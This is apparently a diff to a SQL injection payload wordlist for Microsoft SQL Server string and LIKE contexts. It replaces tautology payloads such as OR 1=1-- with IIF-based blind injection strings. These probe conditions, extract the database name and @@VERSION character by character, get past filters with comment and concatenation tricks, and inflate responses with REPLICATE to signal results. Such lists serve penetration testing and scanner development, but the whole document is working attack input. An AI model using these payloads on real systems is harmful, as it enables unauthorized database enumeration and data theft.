@@ -1,22 +1,29 @@
-%' AND LEN('a')=1 AND 'a'='a
-%' AND DATALENGTH('a')=1 AND 'a'='a
-%' AND CHARINDEX('a','abc')=1 AND 'a'='a
-%' AND PATINDEX('%a%','abc')=1 AND 'a'='a
-%' AND LEFT('abc',1)='a' AND 'a'='a
-%' AND RIGHT('abc',1)='c' AND 'a'='a
-%' AND SUBSTRING('abc',1,1)='a' AND 'a'='a
-%' AND ASCII('a')=97 AND 'a'='a
-%' AND UNICODE('a')=97 AND 'a'='a
-%' AND LOWER('A')='a' AND 'a'='a
-%' AND UPPER('a')='A' AND 'a'='a
-%' AND (1)=1 AND 'a'='a
-%' AND (SELECT 1)=1 AND 'a'='a
-%' OR 1=1-- 
-%' OR 1=1-- -
-%' OR 1=1#
-%' OR 1=1/*
-%' OR 1=1 AND 'a'='a
-%' AND 1=1 AND '1'='1
-%' AND 1=2 AND '1'='1
-%' AND 1 IN (1) AND 'a'='a
-%' AND 1/0=1 AND 'a'='a
+%' + IIF(1=1,'a','b') + '
+%' + IIF(1=2,'a','b') + '
+%' + IIF(1=1,'a','zzz_not_found') + '
+%' + IIF(1=2,'a','zzz_not_found') + '
+%' + IIF(LEN('test')=4,'a','b') + '
+%' + IIF(ASCII('A')=65,'a','b') + '
+%' + IIF(SUBSTRING('test',1,1)='t','a','b') + '
+%' + IIF(LEFT('test',1)='t','a','b') + '
+%' + IIF(1=1,REPLICATE('A',1000),'a') + '
+%' + IIF(1=1,REPLICATE('A',5000),'a') + '
+%' + IIF(1=1,REPLICATE('A',10000),'a') + '
+%' + IIF(1=1,REPLICATE('A',10000),'a') + '
+%' + IIF(1=2,REPLICATE('A',10000),'a') + '
+%' + IIF(1=1,REPLICATE('A',10000),'a') + '
+%' + IIF(1=2,REPLICATE('A',10000),'a') + '
+%' + IIF(1=1,SPACE(10000),'a') + '
+%' + IIF(1=1,FORMATMESSAGE('%10000s','a'),'a') + '
+%' + IIF(1=1,SPACE(10000),'a') + '
+%' + IIF(1=1,FORMATMESSAGE('%10000s','a'),'a') + '
+%' + IIF(LEN(DB_NAME())>0,'a','b') + '
+%' + IIF(LEN(@@VERSION)>0,'a','b') + '
+%' + IIF(SUBSTRING(DB_NAME(),1,1)='m','a','b') + '
+%' + IIF(LEN(D/**/B_NAME())>0,'a','b') + '
+%' + IIF(LEN(DB_NA'+'ME())>0,'a','b') + '
+%' + IIF(SUBSTRING(D/**/B_NAME(),1,1)='m','a','b') + '
+%' + IIF(ASCII(SUBSTRING('test',1,1))=116,'a','b') + '
+%' + IIF(ASCII(SUBSTRING('test',2,1))=101,'a','b') + '
+%' + IIF(ASCII(SUBSTRING('test',1,1))>100,REPLICATE('A',10000),'a') + '
+%' + IIF(ASCII(SUBSTRING(DB_NAME(),1,1))>77,REPLICATE('A',10000),'a') + '
